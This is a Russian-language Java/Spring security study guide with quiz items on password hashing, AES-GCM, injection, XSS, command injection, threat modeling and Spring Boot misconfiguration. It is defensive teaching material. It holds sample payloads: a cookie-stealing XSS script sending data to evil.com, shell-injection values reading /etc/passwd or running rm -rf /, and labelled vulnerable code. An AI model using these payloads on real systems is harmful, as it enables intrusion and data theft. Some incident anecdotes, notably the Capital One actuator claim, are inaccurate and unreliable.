> - [ ] Пароли хранить через `SHA-256` с солью: быстрый алгоритм + уникальная соль решают rainbow tables. | Скорость — и есть проблема: GPU считает миллиарды `SHA-256`/сек. Соль защищает от rainbow tables, но не от brute force. ❌ ПОСЛЕДСТВИЕ: `LinkedIn 2012` — `SHA-1` без соли, 117M паролей раскрыты за дни; даже с солью brute force одного пароля занимает часы на RTX 4090.
> - [ ] Пароли хранить через симметричное шифрование `AES-256` с ключом в `KeyStore` — для восстановления пароля. | Шифрование обратимо: при компрометации ключа все пароли раскрываются. Восстановление пароля — анти-паттерн. ❌ ПОСЛЕДСТВИЕ: `Adobe 2013` — пароли в `3DES`, утекли вместе с hint'ами; 130M пар хэш+hint позволили реверсить пароли (`ECB Penguin` analysis).
> - [x] Пароли хранить через adaptive hashing — `BCrypt(cost=12)` или `Argon2id(64MB, t=3)`; уникальная соль внутри хэша, замедление 100-500 мс, устойчивость к GPU/ASIC. | `BCrypt` — проверенный, `Argon2` — победитель `Password Hashing Competition` (memory-hard). ✓ ПРИМЕНЯТЬ: Spring Security `BCryptPasswordEncoder(12)` по умолчанию + `Argon2PasswordEncoder` для новых проектов. 📋 ПРАВИЛО: «100-500 мс на хэш — намеренное замедление». 🔗 См. Q8, Q10, Q24.
> - [ ] Пароли хранить через `MD5` с солью длиной 32 байта: длинная соль делает brute force невозможным. | Длина соли не влияет на скорость подбора — соль хранится рядом с хэшем и доступна атакующему. ❌ ПОСЛЕДСТВИЕ: триллион `MD5`/сек на современной ферме → пароль из словаря восстанавливается за миллисекунды; `Yahoo 2013` — 3B аккаунтов, частично `MD5` без `bcrypt`-апгрейда.

## Q10. Как правильно использовать AES-GCM для шифрования данных?

`AES-GCM` — authenticated encryption, обеспечивает и конфиденциальность, и целостность данных:

```java
public class AesGcmEncryptor {

    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int IV_LENGTH = 12;   // 96 bit для GCM
    private static final int TAG_LENGTH = 128;  // authentication tag

    public byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {
        // КРИТИЧНО: каждый раз новый IV
        byte[] iv = new byte[IV_LENGTH];
        SecureRandom.getInstanceStrong().nextBytes(iv);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(TAG_LENGTH, iv));

        byte[] ciphertext = cipher.doFinal(plaintext);

        // Склеиваем IV + ciphertext для хранения
        ByteBuffer buffer = ByteBuffer.allocate(IV_LENGTH + ciphertext.length);
        buffer.put(iv);
        buffer.put(ciphertext);
        return buffer.array();
    }

    public byte[] decrypt(byte[] encrypted, SecretKey key) throws Exception {
        ByteBuffer buffer = ByteBuffer.wrap(encrypted);

        byte[] iv = new byte[IV_LENGTH];
        buffer.get(iv);

        byte[] ciphertext = new byte[buffer.remaining()];
        buffer.get(ciphertext);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(TAG_LENGTH, iv));

        return cipher.doFinal(ciphertext); // бросит AEADBadTagException при tamper
    }
}
```

Главные правила:
- **Никогда** не переиспользовать `IV` с одним и тем же ключом — это полностью ломает `GCM`
- Хранить ключи в `Vault` / `KMS`, **не** в коде или конфиге
- Использовать `SecureRandom.getInstanceStrong()` для генерации `IV`
- Рассмотреть `Google Tink` — высокоуровневая обёртка, которая исключает типичные ошибки

> [!mcq]
> - [ ] `AES-GCM` допускает статический `IV` для ускорения шифрования: auth tag защищает от tamper независимо от `IV`. | Статический `IV` в `GCM` ломает конфиденциальность: два ciphertext дают XOR plaintext'ов. ❌ ПОСЛЕДСТВИЕ: `WEP` сломали именно так — переиспользование IV позволяло восстановить plaintext без знания ключа за минуты; такой же класс багов находят в legacy Java-приложениях.
> - [ ] `AES-GCM` — режим без аутентификации, требует дополнительного `HMAC-SHA256`. | `AES-GCM` — AEAD: integrity встроена через 128-bit auth tag. ❌ ПОСЛЕДСТВИЕ: «encrypt-then-MAC» поверх `GCM` — двойная работа и риск ошибок (например, MAC по plaintext вместо ciphertext); правильный `Cipher.getInstance("AES/GCM/NoPadding")` уже даёт integrity.
> - [ ] `AES-GCM` требует фиксированного 16-байтного `IV` для совместимости с `CBC`. | Рекомендуемая длина `IV` для GCM — 12 байт (`NIST SP 800-38D`), 16 байт работают, но медленнее. ❌ ПОСЛЕДСТВИЕ: copy-paste из `CBC`-кода 16-байтный фиксированный `IV` → отсутствие уникальности → утечка plaintext через XOR (см. WEP).
> - [x] `AES-GCM` требует уникального `IV` (96 бит) на каждое шифрование одним ключом; `IV` через `SecureRandom`, сохраняется вместе с ciphertext; переиспользование `IV` ломает конфиденциальность. | AEAD: confidentiality + integrity, tag 128 бит, tamper → `AEADBadTagException`. ✓ ПРИМЕНЯТЬ: `Google Tink` обёртка на AES-GCM для AWS S3 client-side encryption — исключает типичные ошибки. 📋 ПРАВИЛО: «Уникальный 96-bit `IV` на каждое шифрование». 🔗 См. Q8, Q9, Q45.

---

## Q11. (!) Какие виды Injection-атак существуют и как от них защищаться?

`Injection` (`A03:2021`) — когда недоверенный ввод попадает в интерпретатор без безопасной обработки. Основные виды:

```mermaid
graph TD
    A[Injection] --> B[SQL Injection]
    A --> C[NoSQL Injection]
    A --> D[Command Injection]
    A --> E[LDAP Injection]
    A --> F[XSS<br/>HTML/JS Injection]
    A --> G[Expression Language<br/>Injection]
    A --> H[Template Injection<br/>SSTI]
    
    B --> B1["SELECT * FROM users<br/>WHERE id = '1 OR 1=1'"]
    D --> D1["ping; rm -rf /"]
    F --> F1["<script>steal(cookie)</script>"]
```

**Универсальные принципы защиты:**

1. **Параметризованные запросы** — для SQL, LDAP, NoSQL
2. **Валидация на входе** — whitelist допустимых символов/форматов
3. **Экранирование на выходе** — контекстно-зависимое (HTML, JS, URL, CSS)
4. **Принцип минимальных привилегий** — DB-пользователь не должен иметь `DROP` права
5. **WAF** — дополнительный слой, но не замена правильного кода

> [!mcq]
> - [ ] `Injection` (`A03:2021`) включает только SQL Injection; XSS/LDAP/Command — отдельные категории. | В 2021 XSS вошёл в A03 как подтип (HTML/JS Injection); LDAP/Command тоже A03. ❌ ПОСЛЕДСТВИЕ: команда чинит SQL Injection через `PreparedStatement`, но игнорирует `Runtime.exec(host)` → `Command Injection` через `; rm -rf /`; A03 закрыт в чек-листе, дыра остаётся.
> - [x] `Injection` (`A03:2021`) — общий класс атак при попадании недоверенного ввода в интерпретатор; включает SQL/NoSQL/LDAP/Command, XSS, SSTI, EL Injection; защита — параметризация + whitelist-валидация + контекстное экранирование. | Общий root cause: смешение кода и данных. ✓ ПРИМЕНЯТЬ: `PreparedStatement` в JDBC, `@Query(:param)` в Spring Data, `ProcessBuilder` для команд, `Jsoup` для HTML — стандарт в Spring Boot. 📋 ПРАВИЛО: «Параметры отдельно от кода». 🔗 См. Q12, Q13, Q14.
> - [ ] `Injection` защищается только WAF; код приложения может не учитывать injection. | WAF ловит известные паттерны, обходится через кодировки и DNS-rebinding. ❌ ПОСЛЕДСТВИЕ: `Equifax 2017` — `Apache Struts CVE-2017-5638` обошёл `ModSecurity` rules через хитрый Content-Type → 147M записей утекло; параметризация в коде не зависела бы от WAF-правил.
> - [ ] `Injection` защищается только regex-whitelist на входе; параметризация и экранирование избыточны. | Regex не покрывает все легитимные данные (UTF-8, апострофы в именах O'Brien, Unicode normalization). ❌ ПОСЛЕДСТВИЕ: regex `[a-zA-Z]+` отвергает «O'Brien» (legit) и пропускает SQL через Unicode `'` → инцидент с поддержкой клиентов с не-ASCII именами + injection через альтернативные кодировки.

## Q12. (!) Как SQL Injection работает через Spring Data JPA и JDBC?

`Spring Data JPA` защищает от SQL Injection **по умолчанию**, если использовать derived queries или именованные параметры. Но есть ловушки:

**Уязвимый код — конкатенация в нативном запросе:**
```java
// ОПАСНО: прямая конкатенация в native query
@Query(value = "SELECT * FROM users WHERE username = '" + username + "'", 
       nativeQuery = true)
List<User> findByUsername(String username);
// Атака: username = "' OR '1'='1' --"
```

**Уязвимый код — JDBC без параметров:**
```java
// ОПАСНО: конкатенация строк
String sql = "SELECT * FROM users WHERE username = '" + username 
           + "' AND password = '" + password + "'";
jdbcTemplate.queryForList(sql);
```

**Безопасный код — параметризованные запросы:**
```java
// JPA — derived query (безопасно)
Optional<User> findByUsername(String username);

// JPA — именованный параметр (безопасно)
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findUser(@Param("username") String username);

// JDBC — placeholder (безопасно)
String sql = "SELECT * FROM users WHERE username = ? AND status = ?";
jdbcTemplate.query(sql, rowMapper, username, status);

// NamedParameterJdbcTemplate (безопасно)
String sql = "SELECT * FROM users WHERE username = :username";
MapSqlParameterSource params = new MapSqlParameterSource("username", username);
namedJdbcTemplate.query(sql, params, rowMapper);
```

**Особый случай — динамические ORDER BY / table names:**
```java
// Нельзя параметризовать ORDER BY — нужен whitelist
private static final Set<String> ALLOWED_SORT = Set.of("name", "created_at", "email");

public List<User> findSorted(String sortColumn) {
    if (!ALLOWED_SORT.contains(sortColumn)) {
        throw new IllegalArgumentException("Invalid sort column");
    }
    // Безопасно: значение из whitelist
    return jdbcTemplate.query("SELECT * FROM users ORDER BY " + sortColumn, rowMapper);
}
```

> [!mcq]
> - [ ] Spring Data JPA полностью защищает от SQL Injection: любой `@Query` безопасен независимо от конкатенации. | JPA безопасен ТОЛЬКО при derived queries (`findByUsername`) или именованных параметрах (`:param`). Конкатенация в `@Query` — SQL Injection как в чистом JDBC. ❌ ПОСЛЕДСТВИЕ: `@Query("SELECT u FROM User u WHERE u.name = '" + name + "'")` ломается через `' OR '1'='1`; разработчик уверен в «защите JPA», уязвимость живёт годами.
> - [x] Spring Data JPA безопасен при derived queries (`findByUsername(String)`) и именованных параметрах (`@Query` с `:param`); конкатенация в `@Query` — уязвимость; `nativeQuery` тоже требует параметров; для `ORDER BY`/имён таблиц — whitelist. | Параметризация отделяет код от данных на уровне JDBC-драйвера. ✓ ПРИМЕНЯТЬ: `JdbcTemplate.query(sql, rowMapper, userId)` или `NamedParameterJdbcTemplate` — стандарт в Spring Data. 📋 ПРАВИЛО: «`?` или `:param`, никогда `+`». 🔗 См. Q11, Q13, Q14.
> - [ ] `jdbcTemplate.queryForList("... WHERE id = " + userId)` безопасен при `userId` типа `Long` — числа не позволяют injection. | Полагаться на тип нельзя — driver не знает о типе при конкатенации, рантайм boxing/преобразования теряют контракт. ❌ ПОСЛЕДСТВИЕ: `String id = req.getParameter("id"); Long.parseLong(id)` — кто-то меняет на `String` для UUID, конкатенация остаётся, инъекция через `1 OR 1=1` сразу работает; найдено пентестом через год.
> - [ ] Защита от SQL Injection через JPA достигается аннотацией `@Transactional`. | `@Transactional` управляет транзакциями ACID, не защищает от injection. ❌ ПОСЛЕДСТВИЕ: разработчик ставит `@Transactional` на сервис с конкатенацией строк → транзакция фиксирует malicious DELETE атомарно; rollback `ROLLBACK_ON_RUNTIME` не помогает, данные стираются окончательно.

## Q13. Что такое XSS и как от него защищаться на бэкенде?

`XSS` (`Cross-Site Scripting`) — инъекция вредоносного JavaScript в страницы, которые видят другие пользователи. Бэкенд-разработчик отвечает за:

**Stored XSS — сохранённый вредоносный ввод:**
```java
// ОПАСНО: HTML из пользовательского ввода сохраняется как есть
@PostMapping("/api/comments")
public Comment createComment(@RequestBody CommentRequest request) {
    Comment comment = new Comment();
    comment.setText(request.getText()); // "<script>fetch('evil.com?c='+document.cookie)</script>"
    return commentRepository.save(comment);
}
```

**Защита на бэкенде:**
```java
@PostMapping("/api/comments")
public Comment createComment(@RequestBody @Valid CommentRequest request) {
    Comment comment = new Comment();
    // Санитизация HTML — удаляет опасные теги, оставляет безопасные
    String sanitized = Jsoup.clean(request.getText(), Safelist.basic());
    comment.setText(sanitized);
    return commentRepository.save(comment);
}
```

**Security headers** как дополнительный слой:
```java
// Content-Security-Policy предотвращает inline-скрипты
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'"))
    .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
);
```

> [!mcq]
> - [ ] XSS — атака на серверную БД через пользовательский ввод; защита — `PreparedStatement`. | Путаница с SQL Injection. XSS — инъекция JS в HTML-страницы для других пользователей (атака на browser). ❌ ПОСЛЕДСТВИЕ: `PreparedStatement` защитит SQL, но stored XSS в комментарии остаётся: жертва открывает страницу, JS крадёт `JSESSIONID` через `document.cookie`, account takeover.
> - [x] XSS — инъекция JS в HTML-страницы, видимые другим пользователям; защита на бэкенде: санитизация HTML через `Jsoup.clean(text, Safelist.basic())` + `Content-Security-Policy` header + контекстное экранирование. | Бэкенд санитизирует stored content и ставит CSP. Safelist оставляет `<b>`, `<i>`, убирает `<script>`, `on*`-атрибуты. ✓ ПРИМЕНЯТЬ: GitHub использует CSP `script-src 'self'` + Jsoup-подобный sanitizer для issues/PR-комментариев. 📋 ПРАВИЛО: «Sanitize on save + CSP on serve». 🔗 См. Q11, Q19, Q41.
> - [ ] XSS — атака через подмену HTTP-заголовков; защита — `Content-Security-Policy` header. | XSS — инъекция в контент, не в заголовки. CSP блокирует загрузку скриптов в браузере, а не входящие headers. ❌ ПОСЛЕДСТВИЕ: команда настраивает только CSP без санитизации; `unsafe-inline` в legacy CSP пропускает stored XSS из БД → утечка sessions у клиентов через `<script>fetch('evil.com?c='+document.cookie)</script>`.
> - [ ] XSS защищается только `HttpOnly`-флагом на cookies. | `HttpOnly` блокирует чтение cookie через `document.cookie`, но не сам XSS. Вредоносный JS остаётся: keylogger, phishing-форма, CSRF-обход через same-origin запросы. ❌ ПОСЛЕДСТВИЕ: `British Airways 2018` — Magecart внедрил JS на checkout-странице; `HttpOnly`-cookies не помогли, скимили номера карт 380K клиентов, штраф 20M GBP.

## Q14. Что такое Command Injection и как его предотвратить?

`Command Injection` — выполнение произвольных команд ОС через пользовательский ввод:

**Уязвимый код:**
```java
// ОПАСНО: конкатенация в Runtime.exec()
@GetMapping("/api/ping")
public String ping(@RequestParam String host) {
    Process p = Runtime.getRuntime().exec("ping -c 1 " + host);
    // Атака: host = "8.8.8.8; cat /etc/passwd"
    return readOutput(p);
}
```

**Исправленный код:**
```java
private static final Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9.-]{0,253}$");

@GetMapping("/api/ping")
public String ping(@RequestParam String host) {
    // 1. Whitelist-валидация формата
    if (!HOSTNAME_PATTERN.matcher(host).matches()) {
        throw new IllegalArgumentException("Invalid hostname");
    }
    
    // 2. ProcessBuilder — аргументы передаются как отдельные элементы (не через shell)
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", "-W", "3", host);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    
    // 3. Таймаут
    if (!p.waitFor(5, TimeUnit.SECONDS)) {
        p.destroyForcibly();
        throw new TimeoutException("Ping timed out");
    }
    return readOutput(p);
}
```

Ключевое: **`ProcessBuilder`** с массивом аргументов **не запускает shell**, поэтому `;`, `|`, `&&` не интерпретируются.

> [!mcq]
> - [ ] `Command Injection` предотвращается экранированием спецсимволов (`;`, `|`, `&&`) через `String.replace()` перед `Runtime.exec()`. | String-replace обходится через альтернативные кодировки и комбинации (`$IFS`, `\$()`). ❌ ПОСЛЕДСТВИЕ: атакующий шлёт `host=8.8.8.8$IFS$9; rm -rf /`, replace не ловит `$IFS`, shell интерпретирует разделитель → удаление данных на хосте.
> - [ ] `Command Injection` блокируется `SecurityManager` в Java по умолчанию: `Runtime.exec()` требует разрешения на запуск процессов. | `SecurityManager` deprecated for removal в Java 17+. По умолчанию `Runtime.exec()` доступен. ❌ ПОСЛЕДСТВИЕ: разработчик полагается на `SecurityManager`, в Spring Boot 3 (Java 17) код запускается без проверок → RCE через произвольную команду.
> - [x] `Command Injection` предотвращается через `ProcessBuilder("cmd", "arg1", arg2)` с массивом аргументов (без shell-интерпретации) + whitelist-валидация формата + таймаут. | `ProcessBuilder` не запускает shell, поэтому `;`, `|`, `&&` не интерпретируются как разделители. ✓ ПРИМЕНЯТЬ: GitLab Runner использует `ProcessBuilder` для запуска CI-команд изолированно от shell, плюс `seccomp`-профиль. 📋 ПРАВИЛО: «`ProcessBuilder` с массивом, не `Runtime.exec` со строкой». 🔗 См. Q11, Q12, Q41.
> - [ ] `Command Injection` предотвращается заменой `Runtime.exec()` на `ProcessBuilder.command(fullCommandString)` с одной строкой. | `ProcessBuilder.command(String)` принимает один элемент, но при single-string без `/bin/sh -c` разделители всё равно не интерпретируются — однако распространённый паттерн `pb.command("/bin/sh", "-c", "ping " + host)` переводит в shell-mode и injection возвращается. ❌ ПОСЛЕДСТВИЕ: `host="8.8.8.8; cat /etc/passwd"` через `sh -c` → утечка `/etc/passwd`.

---

## Q15. (!) Чем Insecure Design отличается от implementation-багов?

`Insecure Design` (`A04:2021`) — **новая категория** в 2021, подчёркивающая разницу между **дизайном** и **реализацией**:

| Insecure Design | Implementation Bug |
|---|---|
| Архитектура не предусматривает защиту | Защита предусмотрена, но реализована с ошибкой |
| Нельзя исправить лучшим кодом | Можно исправить фиксом конкретного бага |
| Пример: нет rate limit на API восстановления пароля | Пример: rate limit есть, но обходится через заголовок |
| Обнаруживается через threat modeling | Обнаруживается через SAST/DAST/пентест |

**Пример insecure design** — кинотеатр без лимита на бронирование:
```java
// Дизайн: пользователь может забронировать неограниченное количество мест
// Даже идеальная реализация не спасёт от ботов, скупающих все билеты
@PostMapping("/api/bookings")
public Booking createBooking(@RequestBody BookingRequest request) {
    return bookingService.book(request); // Нет лимитов, нет CAPTCHA
}
```

**Secure design:**
```java
@PostMapping("/api/bookings")
@RateLimiter(name = "bookingApi")
public Booking createBooking(@RequestBody @Valid BookingRequest request,
                             @AuthenticationPrincipal UserDetails user) {
    // Бизнес-правило: макс. 10 мест на сеанс на пользователя
    int existing = bookingRepository.countByUserAndSession(user.getId(), request.getSessionId());
    if (existing + request.getSeatCount() > 10) {
        throw new BusinessRuleException("Maximum 10 seats per session");
    }
    return bookingService.book(request, user);
}
```

> [!mcq]
> - [ ] `Insecure Design` (`A04:2021`) — то же, что implementation-баги; разница только в масштабе. | Это разные классы. Insecure Design — нет защиты в архитектуре; implementation bug — защита есть, реализована с ошибкой. ❌ ПОСЛЕДСТВИЕ: команда фиксит rate-limit-bypass (implementation), но в самом дизайне нет ограничения на бронирование — боты скупают билеты на премьеру за секунды (`Taylor Swift Ticketmaster 2022`).
> - [ ] `Insecure Design` (`A04:2021`) обнаруживается только SAST/DAST-сканерами; threat modeling избыточен. | SAST/DAST ищут код-баги, но не отсутствующие контролы. ❌ ПОСЛЕДСТВИЕ: SAST зелёный, DAST зелёный, но дизайн API позволяет обойти оплату через `PUT /order/{id}` без `paymentVerified`-чека → миллионные потери до того, как пентест замечает.
> - [x] `Insecure Design` (`A04:2021`) — архитектурный недостаток, который нельзя исправить лучшей реализацией; обнаруживается через threat modeling; пример: API бронирования без бизнес-лимитов на количество мест. | Rate limit есть, но обходится — implementation. Нет rate limit в принципе — insecure design. ✓ ПРИМЕНЯТЬ: Microsoft `STRIDE` threat modeling в SDL, Netflix Security Champions проводят design review до code review. 📋 ПРАВИЛО: «Threat model на этапе Design, не после релиза». 🔗 См. Q4, Q16, Q17.
> - [ ] `Insecure Design` (`A04:2021`) относится только к UX-дизайну интерфейсов. | A04 — про архитектурный дизайн системы (threat model, контроль доступа, лимиты), не UX. ❌ ПОСЛЕДСТВИЕ: бэкенд-команда игнорирует A04 как «фронтовую тему», не делает threat modeling → выпускают endpoint без auth-design → данные клиентов в открытом доступе (как `Optus 2022`, 9.8M записей).

## Q16. Что такое threat modeling и как его применять?

`Threat modeling` — систематический анализ потенциальных угроз для системы **до начала реализации**. Самая популярная методология — **`STRIDE`**:

```mermaid
graph TD
    S[Spoofing<br/>Подмена идентичности] --> M[Mitigation:<br/>Аутентификация, MFA]
    T[Tampering<br/>Подмена данных] --> M2[Mitigation:<br/>Целостность, подписи]
    R[Repudiation<br/>Отказ от действий] --> M3[Mitigation:<br/>Аудит-логи, подписи]
    I[Information Disclosure<br/>Утечка данных] --> M4[Mitigation:<br/>Шифрование, ACL]
    D[Denial of Service] --> M5[Mitigation:<br/>Rate limiting, scaling]
    E[Elevation of Privilege] --> M6[Mitigation:<br/>Least privilege, RBAC]
```

**Практический процесс:**
1. **Нарисовать DFD** (Data Flow Diagram) — компоненты, потоки данных, trust boundaries
2. **Применить STRIDE** к каждому элементу DFD
3. **Оценить риск** — likelihood × impact
4. **Определить mitigations** — конкретные контрмеры
5. **Задокументировать** — threat model живёт с проектом и обновляется

> Threat modeling — это задача **разработчика**, не только security-команды. Разработчик лучше знает архитектуру и dataflow системы.

> [!mcq]
> - [x] Threat modeling — систематический анализ угроз до реализации через методологию STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege) поверх DFD-диаграммы. | Верное описание. STRIDE — наиболее распространённая методология от Microsoft. Процесс: нарисовать DFD → применить STRIDE к каждому элементу → оценить риск → определить mitigations. Threat model живёт с проектом и обновляется при изменениях.
> - [ ] Threat modeling применяется после релиза через пентест; до релиза архитектурный анализ угроз невозможен, так как нет работающего кода для тестирования. | Threat modeling применяется именно до реализации (на этапе дизайна). Анализ идёт по DFD-диаграммам, а не по работающему коду. Пентест — отдельная активность после релиза, которая находит implementation-баги, а не архитектурные проблемы.
> - [ ] Threat modeling использует методологию CVSS (Common Vulnerability Scoring System) для категоризации угроз по severity; STRIDE устарел и не применяется в современной разработке. | CVSS — это система оценки severity конкретных уязвимостей (CVE), а не методология анализа угроз. STRIDE — актуальная методология для threat modeling (также используются PASTA, LINDDUN, OCTAVE). STRIDE продолжает активно применяться в Microsoft SDL и других SDLC-процессах.
> - [ ] Threat modeling — это задача только security-команды; разработчики должны лишь получать список требований безопасности от security-архитекторов. | Threat modeling — это задача команды разработки, а не только security. Разработчики лучше знают архитектуру и dataflow, поэтому эффективно находят угрозы. Security-команда помогает с методологией и консультирует, но не заменяет разработчиков в анализе.

## Q17. Какие secure design patterns должен знать Java-разработчик?

Ключевые паттерны безопасного дизайна:

**1. Defense in Depth** — несколько уровней защиты (подробнее в Q39):
```java
// Уровень 1: авторизация на URL
// Уровень 2: @PreAuthorize на методе
// Уровень 3: проверка ownership в сервисе
// Уровень 4: Row Level Security в БД
```

**2. Fail-Safe Defaults** — по умолчанию запрещено:
```java
public boolean hasPermission(String user, String resource) {
    // Если нет явного разрешения — запрет
    return permissions.getOrDefault(user, Set.of()).contains(resource);
}
```

**3. Complete Mediation** — каждый запрос проверяется:
```java
// Фильтр безопасности выполняется при КАЖДОМ запросе, не кэшируется
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    // Spring Security по умолчанию проверяет каждый запрос
    http.authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
    return http.build();
}
```

**4. Least Privilege** — минимальные права:
```java
// БД-пользователь приложения — только SELECT/INSERT/UPDATE
// Миграции Flyway — отдельный пользователь с DDL правами
```

**5. Input validation at trust boundary:**
```java
// Валидация на входе в систему, не глубоко внутри
@PostMapping("/api/orders")
public Order createOrder(@RequestBody @Valid OrderRequest request) { ... }
```

> [!mcq]
> - [ ] Fail-Safe Defaults означает, что по умолчанию всё разрешено, а запреты настраиваются явно; это упрощает разработку и снижает количество конфигурационных ошибок. | Это противоположно Fail-Safe Defaults. Принцип гласит: по умолчанию ЗАПРЕЩЕНО, разрешения настраиваются явно. «Permit-by-default» ведёт к уязвимостям при забытых эндпоинтах (новые контроллеры, actuator).
> - [x] Defense in Depth — несколько независимых уровней защиты (URL-авторизация, @PreAuthorize, ownership-проверка в сервисе, RLS в БД); Least Privilege — минимальные права у каждого компонента; Fail-Safe Defaults — запрет по умолчанию. | Верное описание ключевых паттернов. Defense in Depth: при пробитии одного слоя остальные всё ещё защищают. Least Privilege: DB-пользователь без DROP, отдельные accounts для миграций. Complete Mediation: проверка при каждом запросе.
> - [ ] Complete Mediation означает кэширование результатов авторизационных проверок для ускорения; фильтр безопасности запускается один раз на сессию. | Это противоречит Complete Mediation. Принцип требует проверки каждого запроса без кэширования результатов — кэш устаревает при изменении прав. Spring Security по умолчанию проверяет каждый запрос через SecurityFilterChain.
> - [ ] Least Privilege применяется только к пользователям системы, но не к компонентам приложения; сервисы и БД-пользователи должны иметь полные административные права для упрощения администрирования. | Least Privilege применяется ко ВСЕМ субъектам: пользователям, сервисам, БД-пользователям, процессам. DB-пользователь приложения — только SELECT/INSERT/UPDATE. Миграции Flyway — отдельный пользователь с DDL. Админ-права для сервисов увеличивают blast radius при компрометации.

---

## Q18. (!) Какие типичные ошибки конфигурации безопасности встречаются в Spring Boot?

`Security Misconfiguration` (`A05:2021`) — одна из самых частых причин инцидентов. Типичные проблемы в `Spring Boot`:

| Ошибка | Риск | Исправление |
|--------|------|-------------|
| `Actuator` эндпоинты открыты | Утечка env-переменных, секретов | `management.endpoints.web.exposure.include=health,info` |
| `H2 Console` в проде | Прямой доступ к БД | `spring.h2.console.enabled=false` в prod-профиле |
| `Swagger UI` в проде | Раскрытие API-контракта | Отключать через профиль |
| `CORS: allowedOrigins("*")` | Доступ с любого домена | Явный whitelist origin-ов |
| Дефолтные credentials | Полный доступ | Генерация уникальных паролей |
| `server.error.include-stacktrace=always` | Утечка внутренней структуры | `never` в проде |
| Debug-логирование в проде | Утечка данных через логи | `INFO` уровень в проде |

**Пример проблемы — Actuator:**
```yaml
# ОПАСНО: все actuator эндпоинты открыты
management:
  endpoints:
    web:
      exposure:
        include: "*"  # /actuator/env покажет секреты!
```

**Безопасная конфигурация:**
```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info,prometheus
      base-path: /internal  # не /actuator
  endpoint:
    health:
      show-details: when-authorized
    env:
      enabled: false  # отключаем полностью
```

> [!mcq]
> - [ ] `Security Misconfiguration` (`A05:2021`) — только ошибки в коде: забытые `@PreAuthorize`, regex-валидаторы. | Это implementation-баги, не misconfiguration. ❌ ПОСЛЕДСТВИЕ: команда чинит код, но `management.endpoints.web.exposure.include=*` открывает `/actuator/env` всем — `Capital One 2019` именно через `/actuator/env` слил AWS credentials, 100M записей утекло.
> - [x] `Security Misconfiguration` (`A05:2021`) в Spring Boot: открытые actuator-эндпоинты (`exposure.include=*`), `H2 Console`/Swagger в проде, `CORS: "*"`, дефолтные credentials, `include-stacktrace=always`. | `/actuator/env` раскрывает env-переменные с секретами; `H2 Console` — прямой SQL-доступ. ✓ ПРИМЕНЯТЬ: Spring Boot Admin использует `exposure.include=health,info,prometheus` + `base-path=/internal` + `BASIC AUTH` для actuator. 📋 ПРАВИЛО: «Whitelist exposure, не `*`». 🔗 См. Q19, Q20, Q21.
> - [ ] `Security Misconfiguration` решается одним профилем prod: `server.profiles.active=prod` автоматически выключает Swagger/H2/debug. | Профиль — лишь механизм активации; что считать небезопасным, решает разработчик. ❌ ПОСЛЕДСТВИЕ: команда верит в auto-disable, реально `application-prod.yml` пуст, унаследует from `application.yml` с `H2 Console enabled` → прямой `/h2-console/login.jsp` в prod, дамп всей БД.
> - [ ] `Security Misconfiguration` (`A05:2021`) — только Tomcat/Netty конфиг; Spring Boot к категории не относится. | `application.yml`, actuator, CSP, CORS, session — прямая зона A05. ❌ ПОСЛЕДСТВИЕ: команда настраивает только Tomcat connector, оставляет `cors.allowedOrigins("*")` в Spring config → CSRF-эквивалент атак с любого origin, утечка cookie через cross-origin XHR.

## Q19. Как правильно настроить security headers?

Security headers — дешёвый и эффективный слой защиты. В `Spring Security`:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // Запрет embedding в iframe (clickjacking)
        .frameOptions(frame -> frame.deny())
        // Запрет MIME-sniffing
        .contentTypeOptions(Customizer.withDefaults())
        // HSTS — принудительный HTTPS
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .maxAgeInSeconds(31536000))
        // CSP — контроль загружаемых ресурсов
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; script-src 'self'; " +
                              "style-src 'self' 'unsafe-inline'; img-src 'self' data:"))
        // Referrer Policy
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
        // Permissions Policy
        .permissionsPolicy(permissions -> permissions
            .policy("camera=(), microphone=(), geolocation=()"))
    );
    return http.build();
}
```

Проверить headers можно через [securityheaders.com](https://securityheaders.com/).

> [!mcq]
> - [x] Обязательные security headers: Content-Security-Policy (контроль загружаемых ресурсов), X-Frame-Options (clickjacking), X-Content-Type-Options: nosniff (MIME-sniffing), Strict-Transport-Security (HSTS), Referrer-Policy. | Верный список. CSP — самый мощный слой защиты от XSS (default-src 'self'). X-Frame-Options: DENY предотвращает clickjacking через iframe. HSTS принуждает HTTPS. nosniff запрещает браузеру «угадывать» MIME. В Spring Security большинство настраивается через http.headers().
> - [ ] Основной security header — X-XSS-Protection: 1; mode=block; он единственный необходим для защиты от XSS в современных браузерах. | X-XSS-Protection устарел: современные браузеры (Chrome 78+, Firefox, Edge) удалили эту защиту. Защита от XSS строится на CSP (Content-Security-Policy), а не X-XSS-Protection. Заголовок остаётся для legacy-браузеров, но не является основным.
> - [ ] Security headers — это только рекомендация; браузеры сами решают, применять их или игнорировать, поэтому надёжнее полагаться на WAF. | Security headers — это стандарт, поддерживаемый всеми современными браузерами. Браузер обязан применять CSP, HSTS, X-Frame-Options и т. д. Это дешёвый и эффективный слой защиты, который работает на клиенте. WAF — дополнительный слой, не замена.
